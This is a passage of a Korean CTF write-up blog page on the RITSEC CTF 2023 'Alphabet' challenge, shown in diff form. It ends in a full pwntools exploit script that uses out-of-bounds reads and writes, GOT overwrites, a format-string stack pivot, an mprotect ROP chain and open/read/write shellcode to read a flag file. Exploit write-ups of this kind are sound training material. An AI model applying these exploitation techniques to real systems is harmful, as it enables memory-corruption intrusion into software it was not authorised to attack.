+<li><code>0x404820</code>으로 <code>rbp</code>를 변경시키기 위해 <code>ln</code>을 이용하여 <code>0x20</code>을 8 바이트 쓰고 <code>hn</code>을 이용하여 <code>0x4048</code>을 2 바이트 쓰자.<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span> <span class="comment"># 이걸 안하면 calc_checksum의 free(printf)가 호출이 안됨</span></span><br><span class="line">payload += <span class="string">b&#x27;%30c%38$ln%16424c%39$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x90</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x90</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (!!!)</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x404000</span>)</span><br><span class="line">payload += p64(pop_rsi) + p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rdx_r12) + p64(<span class="number">0x7</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]) <span class="comment"># 실행할수 있도록 권한 바꿔주고</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x404c00</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;gets&#x27;</span>]) <span class="comment"># 여기에 쉘코드 입력 후</span></span><br><span class="line">payload += p64(<span class="number">0x404c00</span>) <span class="comment"># 점프</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol start="5">
+<li>그럼 이제 흐름이 <code>bss</code> 영역의 아래 코드로 바뀌는데, 4번에서 스택에 써준 코드<code>(!!!)</code>로 이동한다. (스택 피봇팅 2)</li>
+<li>마지막으로 <code>mprotect</code> 함수로 bss 영역 실행가능하게 설정해주고 <code>gets</code> 함수가 실행되니 <code>flag.txt</code> orw하는 쉘코드를 보내주자.</li>
+</ol>
+<p><code>***</code> <code>calc_checksum</code> 함수에서 <code>fsb</code>를 이용하여 <code>rbp</code>를 <code>bss</code>영역으로 바꿔주었다. 여기까진 괜찮은데 그 다음 입력에서 문제가 발생할 수도 있다. (실제로 발생했다.) 지금 흐름 상황에서는 if문 안으로 들어가면 안된다. </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="comment">/* 이미 진행됨 */</span> &amp;&amp; calc_checksum(buf, len) == buf[len - <span class="number">1</span>] <span class="comment">/* 마지막 바이트 검사*/</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// oob read, write 취약점이 발생하고 bss 영역에 값을 씀</span></span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>의도하지 않은 상황이 발생할 수도 있으므로 익스하는데 필요하지 않은 코드는 최대한 실행시키지 말자는 생각을 가져야 한다. 사실상 마지막 바이트 검사는 틀릴 것이고 중요한 것은 <code>buf</code>와 <code>len</code>을 <code>rbp</code>를 기준으로 참조하기 때문에 위험하다. 그래서 아래 노란색으로 음영진 주소에서 터진다.</p>
+<img src="/images/230412-ritsecctf2023-3Alphabet/Screenshot 2023-04-12 at 20.37.20.png" width=500/>
+<br>
+
+<p>그래서 실제로 터진 주소(<code>rbp-0x48</code>)에는 접근 가능한 적당한 주소 넣어주고 <code>len</code> 에는 1을 넣어줬다.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaw(<span class="number">0x404820</span> - <span class="number">0x4c</span>, p32(<span class="number">1</span>))  <span class="comment"># len</span></span><br><span class="line">aaw(<span class="number">0x404820</span> - <span class="number">0x48</span>, p64(<span class="number">0x404264</span>)) <span class="comment"># buf 암꺼나</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./chall-p&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;ret2win.challenges.ctf.ritsec.club&#x27;, 1337)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall-p&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc_checksum</span>(<span class="params">data</span>):</span><br><span class="line">  result = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">    result += d ^ <span class="number">0x55</span></span><br><span class="line">  <span class="comment"># print(repr(result))</span></span><br><span class="line">  <span class="keyword">return</span> result &amp; <span class="number">0xff</span> <span class="comment"># 1 byte</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. leak stack</span></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(-<span class="number">34</span>, signed=<span class="literal">True</span>) <span class="comment"># idx1 =&gt; oob read</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># idx2 =&gt; oob write</span></span><br><span class="line">payload += p8(calc_checksum(payload))</span><br><span class="line"><span class="comment"># print(repr(payload))</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;characters: &#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)))</span><br><span class="line">info(<span class="built_in">hex</span>(stack)) <span class="comment"># buf address</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. leak libc</span></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(-<span class="number">250</span>, signed=<span class="literal">True</span>) <span class="comment"># idx1 =&gt; oob read</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># idx2 =&gt; oob write.</span></span><br><span class="line">payload += p8(calc_checksum(payload))</span><br><span class="line"><span class="comment"># print(repr(payload))</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;characters: &#x27;</span>)</span><br><span class="line">libc_leak = <span class="built_in">int</span>(u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x64f43</span> - <span class="number">0x28000</span>)</span><br><span class="line">libc.address = libc_leak</span><br><span class="line">info(<span class="built_in">hex</span>(libc_leak))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buf = stack</span><br><span class="line"><span class="comment"># 한바이트씩 임의쓰기</span></span><br><span class="line"><span class="comment"># addr(주소)에 val(값)을 쓰기</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aawb</span>(<span class="params">addr, val</span>):</span><br><span class="line">  <span class="comment"># buf + idx2 + 18</span></span><br><span class="line">  <span class="comment"># 0x7ffd30bf3da0 + idx2 + 18 = 0x1234</span></span><br><span class="line">  <span class="comment"># idx2 = addr - buf - 18</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># aawb(0x12345678, 0x41)</span></span><br><span class="line">  <span class="comment"># 0x401664 &lt;use_packet+391&gt; mov    QWORD PTR [rdx], rax</span></span><br><span class="line">  <span class="comment"># $rax   : 0x4000000060041</span></span><br><span class="line">  <span class="comment"># $rdx   : 0x12345678</span></span><br><span class="line"></span><br><span class="line">  payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">  payload += p64(<span class="built_in">next</span>(libc.search(<span class="built_in">bytes</span>([val]))) - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">  payload += p64(addr - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">  payload += p8(calc_checksum(payload))</span><br><span class="line"></span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># aawb는 한 바이트씩 썼지만 aaw는 aawb를 호출해서 8바이트를 쓸 것</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aaw</span>(<span class="params">addr, values</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(values)):</span><br><span class="line">    aawb(addr+i, values[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss = 0x4040c0</span></span><br><span class="line">bss = <span class="number">0x404800</span> <span class="comment"># bss의 정중앙</span></span><br><span class="line"></span><br><span class="line">ret = libc.address + <span class="number">0x29cd6</span></span><br><span class="line">pop_rsp = libc.address + <span class="number">0x35732</span></span><br><span class="line">pop_rdi = libc.address + <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = libc.address + <span class="number">0x2be51</span></span><br><span class="line">pop_rdx_r12 = libc.address + <span class="number">0x11f497</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop_payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># rop_payload += p64(0x4142434445464748)</span></span><br><span class="line">rop_payload += p64(libc.sym[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">rop_payload += p64(libc.sym[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">rop_payload += p64(ret)</span><br><span class="line">rop_payload += p64(<span class="number">0x42424243</span>)</span><br><span class="line">rop_payload += p64(<span class="number">0x42424244</span>) <span class="comment"># 404820</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">rop_payload += p64(pop_rsp) <span class="comment"># &lt;----!!!</span></span><br><span class="line">rop_payload += p64(buf + <span class="number">0x50</span>) <span class="comment"># 두 번째 스택 피봇팅</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">aaw(bss, rop_payload) <span class="comment"># 0x4040c0:       0x4142434445464748</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =======</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># $rbp   : 0x000000004040e0  →  0x00000042424244 (&quot;DBBB&quot;?)</span></span><br><span class="line"><span class="comment"># 0x401561 &lt;use_packet+132&gt; mov    eax, DWORD PTR [rbp-0x4c] # len</span></span><br><span class="line"><span class="comment"># 0x40156a &lt;use_packet+141&gt; mov    rax, QWORD PTR [rbp-0x48] # buf</span></span><br><span class="line"><span class="comment"># rbp가 bss 영역 주소로 바뀌었기 때문에 $rbp-0x4c와 $rbp-0x48을 참조하면서 안좋은 일이 발생할 수도 있음</span></span><br><span class="line"><span class="comment"># 미리 값을 채워주어 if문 안으로 들엉가는 일이 없도록 len을 1로 설정. 아래 식이 false가 되어야 함.(checksum은 계산된 값이기 때문에 높은 확률로 틀릴 것.) 이 전의 수식은 신경 안써도 됨. 문제는 calc_checksum 안에서 rbp가 바뀌기 때문</span></span><br><span class="line"><span class="comment"># calc_checksum(buf, len) == buf[len - 1]</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">aaw(<span class="number">0x404820</span> - <span class="number">0x4c</span>, p32(<span class="number">1</span>))  <span class="comment"># len</span></span><br><span class="line">aaw(<span class="number">0x404820</span> - <span class="number">0x48</span>, p64(<span class="number">0x404264</span>)) <span class="comment"># buf 암꺼나</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =======</span></span><br><span class="line"><span class="comment"># got 덮혔는지 확인 -&gt; der $_got()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># free@got -&gt; printf</span></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(bss + <span class="number">8</span> - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;free&#x27;</span>] - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += p8(calc_checksum(payload))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __stack_chk_fail@got -&gt; ret</span></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(bss + <span class="number">16</span> - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>] - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += p8(calc_checksum(payload))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fgets@got -&gt; gets</span></span><br><span class="line"><span class="comment"># aaw(e.got[&#x27;fgets&#x27;], p64(libc.sym[&#x27;gets&#x27;])) # 한 바이트씩 바꾸기 때문에 한 바이트씩 바뀐 주소를 호출함. 잘못된 주소를 호출하기 때문에 터짐</span></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(bss - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;fgets&#x27;</span>] - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x12</span> <span class="comment"># &lt;- (!!)</span></span><br><span class="line">payload += p8(calc_checksum(payload))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (!!)</span></span><br><span class="line"><span class="comment"># 여기서 main의 24 line의 len이 19로 고정됨.</span></span><br><span class="line"><span class="comment"># 뒤에 printf에서 17자로 보내야하는데 모자람.</span></span><br><span class="line"><span class="comment"># 이를 위해서 1. aaw를 이용해서 len에 큰 수 넣기. 2. fgets로 덮기 전에 뭔가 더 추가적으로 보내줘서 len이 더 긴 길이로 고정되도록</span></span><br><span class="line"><span class="comment"># 2번 방법을 채택하였음. 그치만 너무 큰 수 보내면 fgets 길이 제한에 걸리니 적당한 수를 보내야 함</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==============</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 이제 fgets 대신 gets가 실행되니 bof가 터지는 상황</span></span><br><span class="line"><span class="comment"># printf (fsb가 터짐): rbp 변경 -&gt; 흐름이 bss 영역으로 바뀐다. (스택 피봇팅 두 번 할 것임)</span></span><br><span class="line"><span class="comment"># 첫 번째 스택 피봇팅: bss 영역으로 이동해서 pop_rsp 실행</span></span><br><span class="line"><span class="comment"># 두 번째 스택 피봇팅: 다시 스택으로 돌아와서 남은 페이로드 실행</span></span><br><span class="line"><span class="comment"># payload : mprotect로 버퍼 권한 변경해주고 그 버퍼에 gets 함수로 입력을 받을 것.</span></span><br><span class="line"><span class="comment"># gets 함수 입력으로 flag orw</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 스택에 있는 rbp 주소를 bss 영역으로 바꾼다.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ln -&gt; 8 byte 씀</span></span><br><span class="line"><span class="comment"># hn -&gt; 2 byte 씀</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x404820:       0x0000000042424244</span></span><br><span class="line"><span class="comment"># calc_checksum의 rbp는 이 함수를 호출한 함수의 &lt;rbp가 저장된 주소&gt;</span></span><br><span class="line"><span class="comment"># a주소(rsp) : use_packet 함수의 rbp</span></span><br><span class="line"><span class="comment"># buf와 a주소의 오프셋은 0x90</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span> <span class="comment"># 이걸 안하면 calc_checksum의 free(printf)가 호출이 안됨</span></span><br><span class="line">payload += <span class="string">b&#x27;%30c%38$ln%16424c%39$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x90</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x90</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x404000</span>)</span><br><span class="line">payload += p64(pop_rsi) + p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rdx_r12) + p64(<span class="number">0x7</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]) <span class="comment"># 실행할수 있도록 권한 바꿔주고</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x404c00</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;gets&#x27;</span>]) <span class="comment"># 여기에 쉘코드 입력 후</span></span><br><span class="line">payload += p64(<span class="number">0x404c00</span>) <span class="comment"># 점프</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = asm(</span><br><span class="line">    <span class="string">&#x27;sub rsp, 0x100&#x27;</span></span><br><span class="line">    + shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>)</span><br><span class="line">    + shellcraft.read(<span class="number">3</span>, <span class="number">0x404400</span>, <span class="number">0x100</span>)</span><br><span class="line">    + shellcraft.write(<span class="number">1</span>, <span class="number">0x404400</span>, <span class="number">0x100</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solve"><span class="toc-number">2.</span> <span class="toc-text">Solve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Code</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/&text=RITSEC CTF 2023 - Alphabet (oob read, write)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/&title=RITSEC CTF 2023 - Alphabet (oob read, write)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/&is_video=false&description=RITSEC CTF 2023 - Alphabet (oob read, write)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RITSEC CTF 2023 - Alphabet (oob read, write)&body=Check out this article: https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/&title=RITSEC CTF 2023 - Alphabet (oob read, write)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/&title=RITSEC CTF 2023 - Alphabet (oob read, write)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/&title=RITSEC CTF 2023 - Alphabet (oob read, write)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/&title=RITSEC CTF 2023 - Alphabet (oob read, write)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/&name=RITSEC CTF 2023 - Alphabet (oob read, write)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230412-ritsecctf2023-3Alphabet/&t=RITSEC CTF 2023 - Alphabet (oob read, write)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    jir4vvit
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
